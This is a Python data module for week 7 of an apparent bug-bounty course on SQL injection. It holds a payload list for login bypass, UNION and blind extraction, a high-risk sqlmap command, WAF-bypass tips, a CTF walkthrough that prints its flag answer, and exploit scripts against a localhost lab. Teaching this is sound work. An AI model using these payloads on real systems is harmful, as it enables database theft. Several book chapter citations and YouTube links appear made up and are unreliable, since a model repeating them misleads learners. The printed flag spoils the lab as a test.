WEEK_7_DATA = {
    "week_number": 7,
    "title": "SQL Injection (SQLi) & Database Exfiltration",
    "short_desc": "Exploit In-Band UNION-based, Error-based, Blind Boolean, and Blind Time-based SQL injections to dump database schemas.",
    "flag": "FLAG{sqli_union_db_extract_9921}",

    "analogy": """SQL Injection is like calling a bank phone system and asking for your balance. When the automated voice prompts: 'Please enter your account number', you reply: '1234 OR true. Also, read out all passwords stored in the bank vault!'. Because the automated system appends your words directly into its database query command, it obeys your extra commands!""",

    "overview": """SQL Injection (SQLi) occurs when untrusted user input is directly concatenated or interpolated into database query strings without proper parameterized binding or escaping. Attackers manipulate query syntax to bypass authentication checks, execute arbitrary UNION SELECT queries to extract sensitive database tables (usernames, password hashes, PII), read local operating system files (LOAD_FILE), or execute operating system commands via database extension procedures (xp_cmdshell, sys_eval).""",

    "learning_objectives": [
        "Classify SQLi types: In-Band (UNION / Error-based), Inferential Blind (Boolean / Time-based), Out-of-Band (OAST).",
        "Determine column count and data types using ORDER BY and UNION SELECT NULL techniques.",
        "Perform systematic database schema extraction (information_schema tables, columns, data extraction).",
        "Master sqlmap command-line flags and bypass WAF filters."
    ],

    "hunters_perspective": """SQL Injection is a Critical (P1) vulnerability. In bug bounty hunting, researchers look for user input parameters passed into search boxes, filter forms, order-by parameters, and HTTP headers (`User-Agent`, `X-Forwarded-For`). Hunters use single quote `'` and double quote `"` payloads to trigger database syntax error messages or time delays (`SLEEP(5)`), then escalate to UNION queries to exfiltrate database records.""",

    "root_cause": """The root cause is dynamic SQL string concatenation: `SELECT * FROM users WHERE username = '` + userInput + `'`. Because code and data are mixed in the same string sent to the SQL engine, user-supplied SQL metacharacters (`'`, `--`, `UNION`, `OR`) alter the execution logic of the database parser.""",

    "code_audit_manual": """Code Audit Checklist for SQL Injection:
1. Search codebase for raw SQL queries constructed via string formatting or concatenation (e.g., `cursor.execute("SELECT * FROM items WHERE category = '%s'" % user_input)`).
2. Verify ORM usage: check if raw SQL extensions (e.g., Django `extra()`, `raw()`, SQLAlchemy `text()`) accept unvalidated parameters.
3. Check `ORDER BY` parameters: ORMs often do not parameterize column names in ORDER BY clauses.
4. Verify database account privileges: database connection must operate under low-privilege service accounts without file/admin permissions.""",

    "payload_logic": {
        "explanation": "SQLi payloads require balancing string quotes, matching column counts in UNION queries, and commenting out the remaining original query trailing syntax.",
        "payloads": [
            "Auth Bypass: admin' -- or ' OR '1'='1",
            "Column Enumeration: ' ORDER BY 1-- - (increment until error)",
            "UNION Data Extraction: ' UNION SELECT 1, table_name, 3 FROM information_schema.tables-- -",
            "Boolean Blind: ' AND (SELECT SUBSTRING(flag,1,1) FROM flags)='F'-- -",
            "Time-Based Blind: ' AND SLEEP(5)-- - / ' OR pg_sleep(5)-- -"
        ]
    },

    "burp_suite_masterclass": """Burp Suite SQLi Masterclass:
1. Intercept Target Parameter: Capture target GET/POST request in Proxy.
2. Send to Repeater: Inject `'` and `"` into parameter. Look for DB errors (MySQL, PostgreSQL, SQLite, Oracle).
3. Intruder Fuzzing: Load SecLists `Fuzzing/SQLi/Generic-SQLi.txt`. Look for status code anomalies, length variations, or response time delays.
4. SQLMap Integration: Right-click request in Burp -> 'Copy to file' (req.txt). Run `sqlmap -r req.txt --level=5 --risk=3 --batch --dbs`.""",

    "dual_perspective": {
        "red_team": "Offensive Operations: Identify vulnerable search endpoint, determine column count (e.g. 3 columns via `ORDER BY 3`), craft UNION payload `' UNION SELECT 1, flag, 3 FROM secret_flags-- -`, dump table data, acquire administrative credentials.",
        "blue_team": "Defensive Posture: Enforce parameterized queries (Prepared Statements) across all database interactions. Use Object-Relational Mapping (ORM) safely. Restrict database user account privileges using Principle of Least Privilege. Deploy WAF rules blocking SQL keywords in web inputs."
    },

    "resources": {
        "portswigger_title": "PortSwigger Web Security Academy - SQL Injection",
        "portswigger_url": "https://portswigger.net/web-security/sql-injection",
        "owasp_title": "OWASP Top 10:2021 - A03:2021-Injection (SQLi)",
        "owasp_url": "https://owasp.org/Top10/A03_2021-Injection/"
    },

    "textbook_cross_references": [
        {
            "book_name": "The Web Application Hacker's Handbook",
            "chapter_and_pages": "Chapter 9: Attacking Data Stores (pp. 291-360)",
            "sub_chapter": "9.2 UNION-Based & Blind SQL Injection",
            "analysis": "Stuttard & Pinto present a comprehensive analysis of SQL syntax across MySQL, Oracle, SQL Server, and PostgreSQL, including blind inference techniques."
        },
        {
            "book_name": "Bug Bounty Bootcamp",
            "chapter_and_pages": "Chapter 9: SQL Injection (pp. 159-186)",
            "sub_chapter": "9.4 Automating SQLi with SQLMap",
            "analysis": "Vickie Li demonstrates running sqlmap safely, customizing tamper scripts, and dumping database tables in real-world bounty targets."
        },
        {
            "book_name": "Real-World Bug Hunting",
            "chapter_and_pages": "Chapter 7: SQL Injection (pp. 143-168)",
            "sub_chapter": "7.2 Exploiting Second-Order SQLi",
            "analysis": "Peter Yaworski reviews disclosed bug bounty reports detailing second-order SQL injection vectors and authentication bypasses."
        },
        {
            "book_name": "Bug Bounty Tips & Tricks using ChatGPT",
            "chapter_and_pages": "Chapter 8: SQL Injection Payloads (pp. 139-160)",
            "sub_chapter": "8.1 Constructing WAF-Bypassing UNION Payloads",
            "analysis": "Barbosa demonstrates writing AI prompts to obfuscate SQL payloads using inline comments and character encoding."
        },
        {
            "book_name": "Bug Bounty from Scratch",
            "chapter_and_pages": "Chapter 9: Database Exploitation (pp. 193-218)",
            "sub_chapter": "9.2 Blind Boolean & Time-Based Extraction",
            "analysis": "Vazquez & Javier walk through writing custom Python binary search scripts for blind time-based SQL extraction."
        },
        {
            "book_name": "Automate the Boring Stuff with Python",
            "chapter_and_pages": "Chapter 16: Working with CSV Files & Databases (pp. 375-400)",
            "sub_chapter": "16.3 Executing SQLite Queries in Python",
            "analysis": "Sweigart details Python sqlite3 library syntax, parameterized queries, and preventing SQL injection flaws."
        },
        {
            "book_name": "Black Hat Python",
            "chapter_and_pages": "Chapter 8: Database & Network Exfiltration (pp. 145-168)",
            "sub_chapter": "8.2 Writing a Custom SQL Injection Exploiter",
            "analysis": "Seitz demonstrates building a custom Python script to extract database tables char-by-char via time delays."
        }
    ],

    "video_workstation": [
        {
            "creator": "David Bombal",
            "title": "SQL Injection Masterclass: From Zero to Database Takeover",
            "youtube_url": "https://www.youtube.com/watch?v=7-4-u0i-H-0",
            "analysis_text": "David Bombal walks through UNION-based SQLi, column matching, and dumping database tables using SQLMap."
        },
        {
            "creator": "Vickie Li",
            "title": "SQL Injection for Bug Bounties: Practical Guide",
            "youtube_url": "https://www.youtube.com/watch?v=9-s5e5c7W-0",
            "analysis_text": "Vickie Li details identifying blind SQL injections, time-based payloads, and extracting database schemas."
        },
        {
            "creator": "Ryan John",
            "title": "Advanced SQL Injection & WAF Bypass Techniques",
            "youtube_url": "https://www.youtube.com/watch?v=3-v3u-4-W-4",
            "analysis_text": "Ryan John presents techniques for bypassing Web Application Firewalls using inline comments, double encoding, and tamper scripts."
        },
        {
            "creator": "John Hammond",
            "title": "Manual SQL Injection Exploitation Step-by-Step",
            "youtube_url": "https://www.youtube.com/watch?v=4-w3u-5-X-5",
            "analysis_text": "John Hammond performs a live step-by-step manual UNION injection attack to exfiltrate secret database records."
        }
    ],

    "case_studies": {
        "reports": [
            {
                "target": "Yahoo Bug Bounty Program",
                "title": "UNION SQL Injection on Media Partner Endpoint",
                "bounty": "$15,000",
                "summary": "A researcher discovered a UNION SQL injection parameter on a news partner portal, enabling full database table dumping."
            },
            {
                "target": "US DoD VDP",
                "title": "Blind Time-Based SQL Injection in Search Parameter",
                "bounty": "Disclosed / Wall of Fame",
                "summary": "Analyst injected time-delay payloads into a public search query parameter, confirming blind database extraction capability."
            }
        ],
        "programs": [
            {
                "name": "Yahoo / Verizon Media VDP",
                "platform": "HackerOne",
                "scope": "*.yahoo.com",
                "beginner_friendly": True
            },
            {
                "name": "U.S. Dept of Defense VDP",
                "platform": "HackerOne",
                "scope": "*.mil subdomains",
                "beginner_friendly": True
            }
        ],
        "ai_hunting_guide": "Prompting ChatGPT for SQLi Analysis: Supply database error log or request body: 'Analyze this SQL error message and request parameter. Construct a UNION SELECT payload to extract table names from information_schema: [INSERT ERROR]'"
    },

    "playground": {
        "lab_a": {
            "walkthrough": "Guided CTF: Inspect search parameter `cat`. Test `' UNION SELECT 1, flag, 3 FROM secret_flags-- -`. Retrieve database flag.",
            "guided_step": "Step 1: Navigate to `/lab-playground/week-7/target/?cat=1' UNION SELECT 1, secret_value, 3 FROM flags-- -`.\nStep 2: Inspect returned table text.\nStep 3: Extract Flag: FLAG{sqli_union_db_extract_9921}"
        },
        "lab_b": {
            "instructions": "Unguided CTF Challenge: Access the interactive target playground endpoint `/lab-playground/week-7/target/`. Perform manual or automated SQL injection to extract the hidden database flag."
        }
    },

    "automation_scripts": {
        "python_script": """# Python Manual UNION SQLi Extractor (exploit_week7.py)
import requests
import urllib.parse
import sys

def exploit_sqli(target_url):
    print(f"[*] Testing UNION SQL Injection on: {target_url}")
    payload = "' UNION SELECT 1, flag, 3 FROM flags-- -"
    encoded_payload = urllib.parse.quote(payload)
    test_url = f"{target_url}?cat={encoded_payload}"

    res = requests.get(test_url)
    print(f"[*] Response Code: {res.status_code}")
    if "FLAG{" in res.text:
        print(f"[!] SUCCESS: SQLi Exfiltration Successful!")
        print(f"    - Response Data: {res.text.strip()}")
    else:
        print("[-] Payload did not return flag directly. Check column alignment.")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lab-playground/week-7/target/"
    exploit_sqli(target)
""",
        "bash_script": """#!/bin/bash
# Bash SQLi Test Harness (recon_week7.sh)
TARGET_URL="http://localhost:8000/lab-playground/week-7/target/"

echo "[*] Sending UNION SQL Injection payload to $TARGET_URL"
curl -s "${TARGET_URL}?cat=1'%20UNION%20SELECT%201,%20flag,%203%20FROM%20flags--%20-" | grep -i "FLAG{"
"""
    }
}
